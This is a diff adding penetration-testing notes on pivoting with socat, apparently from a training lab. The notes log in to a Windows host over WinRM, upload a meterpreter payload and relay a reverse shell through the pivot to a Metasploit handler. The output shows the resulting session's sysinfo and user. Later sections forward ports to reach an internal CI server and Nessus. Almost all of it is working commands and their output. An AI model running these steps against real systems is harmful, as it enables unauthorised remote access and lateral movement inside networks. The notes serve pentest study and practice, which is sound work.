@@ -1,0 +1,129 @@
+#### Socat reverse shell via pivot machine
+
+## On attacking machine 
+PSremote to pivot machine. Then upload meterpreter shell.
+
+┌─[root@pivot]─[/home/user/Desktop/evil-winrm]
+└──╼ #evil-winrm -i 192.168.234.150 --user ciadmin --password "SNIPPED"
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\> upload /tmp/shell.exe c://temp/
+Info: Uploading /tmp/shell.exe to c://temp/
+                                                             
+Data: 9556 bytes of 9556 bytes copied
+
+Info: Upload successful!
+
+## Establish socat relay
+The command below tells socat to listen to port 443 and then forward it to attacking machine.
+In addition, confirmed using netstat that socat is listening on port 443.
+
+┌─[✗]─[root@pivot]─[~]
+└──╼ #socat tcp-l:443 tcp:192.168.179.128:443 &
+[1] 161961
+┌─[root@pivot]─[~]
+└──╼ #netstat -tnap | grep 443
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      161961/socat        
+┌─[root@pivot]─[~]
+└──╼ #
+
+
+## Start listener on attacking machine
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.179.128:443 
+
+## Execute shell
+On victim machine, execute meterpreter payload
+
+*Evil-WinRM* PS C:\temp> cmd.exe /c shell.exe
+
+## Observe results
+On attacking machine, observe the meterpreter shell.
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.179.128:443 
+[*] Sending stage (200262 bytes) to 192.168.179.130
+[*] Meterpreter session 1 opened (192.168.179.128:443 -> 192.168.179.130:54474) at 2021-11-10 00:30:38 +0800
+
+meterpreter > sysinfo
+Computer        : CI
+OS              : Windows 10 (10.0 Build 19042).
+Architecture    : x64
+System Language : en_US
+Domain          : DOLLARCORP
+Logged On Users : 8
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: DOLLARCORP\ciadmin
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 11
+============
+Name         : Intel(R) 82574L Gigabit Network Connection
+Hardware MAC : 00:0c:29:0e:14:43
+MTU          : 1500
+IPv4 Address : 192.168.234.150
+IPv4 Netmask : 255.255.255.0
+
+
+#### Socat port forwarding
+Below command will forward any connections made to its port 8888 into the target(CI machine) port 8080.
+
+fork - put every connection into a new process
+reuseaddr - port stays open after a connection is made to it
+
+## Creating port forwarding and confirming it
+┌─[✗]─[root@pivot]─[~]
+└──╼ #socat tcp-l:8888,fork,reuseaddr tcp:192.168.234.150:8080 &
+[1] 162318
+┌─[root@pivot]─[~]
+└──╼ #netstat -tnap|grep 8888
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      162318/socat        
+┌─[root@pivot]─[~]
+└──╼ #
+
+## Results
+Observe that when curl is done to pivot machine port 8888. It is forwarded to the CI port machine 8888.
+
+┌─[✗]─[user@attack]─[/tmp]
+└──╼ $curl http://pivot:8888/robots.txt
+# we don't want robots to click "build" links
+User-agent: *
+Disallow: /┌─[user@attack]─[/tmp]
+└──╼ $
+
+## Expanding on reuseaddr 
+Pivot machine has nessus running in the background on port 8834.
+Upon connecting to port 9999 on pivot machine, I will be able to access nessus on pivot.
+
+┌─[✗]─[root@pivot]─[~]
+└──╼ #socat tcp-l:9999,fork,reuseaddr tcp:127.0.0.1:8834 &
+[2] 162424
+
+┌─[✗]─[user@attack]─[/tmp]
+└──╼ $curl https://pivot:9999 -k
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+        <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests; block-all-mixed-content; form-action 'self'; frame-src https://store.tenable.com; default-src 'self'; connect-src 'self'; script-src 'self'; img-src 'self' data:; style-src 'self'; object-src 'none'; base-uri 'self';" />
